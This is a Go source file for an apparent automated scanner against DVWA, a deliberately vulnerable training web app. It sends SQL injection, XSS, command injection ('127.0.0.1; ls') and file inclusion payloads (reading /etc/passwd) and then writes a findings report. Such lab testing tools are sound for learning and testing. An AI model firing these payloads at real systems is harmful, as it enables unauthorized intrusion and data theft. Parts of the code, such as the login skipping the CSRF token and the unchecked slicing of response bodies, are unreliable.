package agent

import (
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"regexp"
	"strings"
	"time"
)

type DVWAClient struct {
	baseURL    string
	client     *http.Client
	cookieJar  *cookiejar.Jar
	security   string
	isLoggedIn bool
}

type ScanResult struct {
	Target      string
	ScanTime    time.Time
	Vulnerabilities []Vulnerability
}

type Vulnerability struct {
	Type        string
	Severity    string
	Description string
	Endpoint    string
	Proof       string
}

func NewDVWAClient(baseURL string) (*DVWAClient, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
		Jar:     jar,
	}

	return &DVWAClient{
		baseURL:    baseURL,
		client:     client,
		cookieJar:  jar,
		security:   "low",
		isLoggedIn: false,
	}, nil
}

func (d *DVWAClient) Login(username, password string) error {
	loginURL := d.baseURL + "/login.php"
	
	// First get the login page to get CSRF token
	resp, err := d.client.Get(loginURL)
	if err != nil {
		return fmt.Errorf("failed to get login page: %v", err)
	}
	defer resp.Body.Close()
	
	// Now send the login request
	loginData := fmt.Sprintf("username=%s&password=%s&Login=Login", username, password)
	
	req, err := http.NewRequest("POST", loginURL, strings.NewReader(loginData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	
	resp, err = d.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	// Check if login was successful
	body, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(body), "Welcome") || strings.Contains(string(body), "index.php") {
		d.isLoggedIn = true
		return nil
	}
	
	return fmt.Errorf("login failed")
}

func (d *DVWAClient) SetSecurityLevel(level string) error {
	securityURL := d.baseURL + "/security.php"
	
	data := fmt.Sprintf("security=%s&seclev_submit=Submit", level)
	
	req, err := http.NewRequest("POST", securityURL, strings.NewReader(data))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	
	resp, err := d.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 200 {
		d.security = level
		return nil
	}
	
	return fmt.Errorf("failed to set security level")
}

func (d *DVWAClient) Get(url string) (*http.Response, error) {
	return d.client.Get(d.baseURL + url)
}

func (d *DVWAClient) Post(url string, data string) (*http.Response, error) {
	req, err := http.NewRequest("POST", d.baseURL+url, strings.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	
	return d.client.Do(req)
}

func (d *DVWAClient) TestSQLi() (*Vulnerability, error) {
	if !d.isLoggedIn {
		return nil, fmt.Errorf("not logged in")
	}
	
	vulns := []struct {
		endpoint  string
		payload   string
		successMsg string
	}{
		{"/vulnerabilities/sqli/", "1' OR '1'='1", "First name"},
		{"/vulnerabilities/sqli/", "'", "You have an error in your SQL syntax"},
	}
	
	for _, v := range vulns {
		testURL := fmt.Sprintf("%s?id=%s&Submit=Submit", v.endpoint, v.payload)
		resp, err := d.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		body, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(body), v.successMsg) {
			return &Vulnerability{
				Type:        "SQL Injection",
				Severity:    "CRITICAL",
				Description: "SQL injection vulnerability detected",
				Endpoint:    testURL,
				Proof:       string(body[:200]),
			}, nil
		}
	}
	
	return nil, nil
}

func (d *DVWAClient) TestXSS() ([]Vulnerability, error) {
	var results []Vulnerability
	
	if !d.isLoggedIn {
		return nil, fmt.Errorf("not logged in")
	}
	
	xssTests := []struct {
		endpoint  string
		payload   string
		param     string
	}{
		{"/vulnerabilities/xss_r/", "<script>alert(1)</script>", "name"},
		{"/vulnerabilities/xss_s/", "<script>alert('XSS')</script>", "mtxMessage"},
		{"/vulnerabilities/xss_d/", "<img src=x onerror=alert(1)>", "default"},
	}
	
	for _, test := range xssTests {
		testURL := fmt.Sprintf("%s?%s=%s", test.endpoint, test.param, test.payload)
		resp, err := d.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		body, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(body), test.payload) {
			results = append(results, Vulnerability{
				Type:        "Cross-Site Scripting (XSS)",
				Severity:    "HIGH",
				Description: "XSS vulnerability detected",
				Endpoint:    testURL,
				Proof:       "Payload reflected in response",
			})
		}
	}
	
	return results, nil
}

func (d *DVWAClient) TestCommandInjection() (*Vulnerability, error) {
	if !d.isLoggedIn {
		return nil, fmt.Errorf("not logged in")
	}
	
	testURL := "/vulnerabilities/exec/"
	payload := "127.0.0.1; ls"
	
	data := fmt.Sprintf("ip=%s&Submit=Submit", payload)
	resp, err := d.Post(testURL, data)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	indicators := []string{"index.php", "phpinfo.php", "vulnerabilities"}
	for _, ind := range indicators {
		if strings.Contains(string(body), ind) {
			return &Vulnerability{
				Type:        "Command Injection",
				Severity:    "CRITICAL",
				Description: "Command injection vulnerability detected",
				Endpoint:    testURL,
				Proof:       string(body[:300]),
			}, nil
		}
	}
	
	return nil, nil
}

func (d *DVWAClient) TestFileInclusion() ([]Vulnerability, error) {
	var results []Vulnerability
	
	if !d.isLoggedIn {
		return nil, fmt.Errorf("not logged in")
	}
	
	lfiTests := []struct {
		endpoint  string
		payload   string
		expected  string
	}{
		{"/vulnerabilities/fi/", "../../../../etc/passwd", "root:"},
		{"/vulnerabilities/fi/", "php://filter/convert.base64-encode/resource=index.php", "base64"},
	}
	
	for _, test := range lfiTests {
		testURL := fmt.Sprintf("%s?page=%s", test.endpoint, test.payload)
		resp, err := d.Get(testURL)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		body, _ := io.ReadAll(resp.Body)
		if strings.Contains(string(body), test.expected) {
			results = append(results, Vulnerability{
				Type:        "Local File Inclusion (LFI)",
				Severity:    "HIGH",
				Description: "Local file inclusion vulnerability detected",
				Endpoint:    testURL,
				Proof:       "File inclusion successful",
			})
		}
	}
	
	return results, nil
}

func (d *DVWAClient) TestCSRF() (*Vulnerability, error) {
	if !d.isLoggedIn {
		return nil, fmt.Errorf("not logged in")
	}
	
	csrfURL := "/vulnerabilities/csrf/"
	
	resp, err := d.Get(csrfURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, _ := io.ReadAll(resp.Body)
	
	// Check for CSRF patterns
	csrfPatterns := []string{
		"<input.*name.*token",
		"<input.*name.*csrf",
		"user_token",
	}
	
	for _, pattern := range csrfPatterns {
		matched, _ := regexp.MatchString(pattern, string(body))
		if matched {
			return &Vulnerability{
				Type:        "CSRF Detection",
				Severity:    "INFORMATIONAL",
				Description: "CSRF protection mechanism detected",
				Endpoint:    csrfURL,
				Proof:       "Token field present",
			}, nil
		}
	}
	
	return &Vulnerability{
		Type:        "CSRF Vulnerability",
		Severity:    "MEDIUM",
		Description: "No CSRF protection detected",
		Endpoint:    csrfURL,
		Proof:       "No anti-CSRF tokens found",
	}, nil
}

func (d *DVWAClient) FullScan() (*ScanResult, error) {
	result := &ScanResult{
		Target:      d.baseURL,
		ScanTime:    time.Now(),
		Vulnerabilities: []Vulnerability{},
	}
	
	// Test SQL Injection
	if sqliVuln, err := d.TestSQLi(); err == nil && sqliVuln != nil {
		result.Vulnerabilities = append(result.Vulnerabilities, *sqliVuln)
	}
	
	// Test XSS
	if xssVulns, err := d.TestXSS(); err == nil {
		result.Vulnerabilities = append(result.Vulnerabilities, xssVulns...)
	}
	
	// Test Command Injection
	if cmdVuln, err := d.TestCommandInjection(); err == nil && cmdVuln != nil {
		result.Vulnerabilities = append(result.Vulnerabilities, *cmdVuln)
	}
	
	// Test File Inclusion
	if lfiVulns, err := d.TestFileInclusion(); err == nil {
		result.Vulnerabilities = append(result.Vulnerabilities, lfiVulns...)
	}
	
	// Test CSRF
	if csrfVuln, err := d.TestCSRF(); err == nil && csrfVuln != nil {
		result.Vulnerabilities = append(result.Vulnerabilities, *csrfVuln)
	}
	
	return result, nil
}

func (d *DVWAClient) GenerateReport(result *ScanResult) string {
	var sb strings.Builder
	
	sb.WriteString(strings.Repeat("=", 80) + "\n")
	sb.WriteString("                         DVWA VULNERABILITY SCAN REPORT\n")
	sb.WriteString(strings.Repeat("=", 80) + "\n\n")
	sb.WriteString(fmt.Sprintf("Target:        %s\n", result.Target))
	sb.WriteString(fmt.Sprintf("Scan Time:     %s\n", result.ScanTime.Format(time.RFC1123)))
	sb.WriteString(fmt.Sprintf("Total Found:   %d vulnerabilities\n\n", len(result.Vulnerabilities)))
	
	// Count by severity
	counts := map[string]int{"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFORMATIONAL": 0}
	for _, v := range result.Vulnerabilities {
		counts[v.Severity]++
	}
	
	sb.WriteString("Severity Breakdown:\n")
	sb.WriteString(fmt.Sprintf("  CRITICAL:      %d\n", counts["CRITICAL"]))
	sb.WriteString(fmt.Sprintf("  HIGH:          %d\n", counts["HIGH"]))
	sb.WriteString(fmt.Sprintf("  MEDIUM:        %d\n", counts["MEDIUM"]))
	sb.WriteString(fmt.Sprintf("  LOW:           %d\n", counts["LOW"]))
	sb.WriteString(fmt.Sprintf("  INFORMATIONAL: %d\n\n", counts["INFORMATIONAL"]))
	
	sb.WriteString(strings.Repeat("-", 80) + "\n")
	sb.WriteString("DETAILED FINDINGS\n")
	sb.WriteString(strings.Repeat("-", 80) + "\n\n")
	
	for i, vuln := range result.Vulnerabilities {
		sb.WriteString(fmt.Sprintf("[%d] [%s] %s\n", i+1, vuln.Severity, vuln.Type))
		sb.WriteString(fmt.Sprintf("    Description: %s\n", vuln.Description))
		sb.WriteString(fmt.Sprintf("    Endpoint:    %s\n", vuln.Endpoint))
		if vuln.Proof != "" {
			sb.WriteString(fmt.Sprintf("    Proof:       %s\n", vuln.Proof))
		}
		sb.WriteString("\n")
	}
	
	sb.WriteString(strings.Repeat("=", 80) + "\n")
	
	return sb.String()
}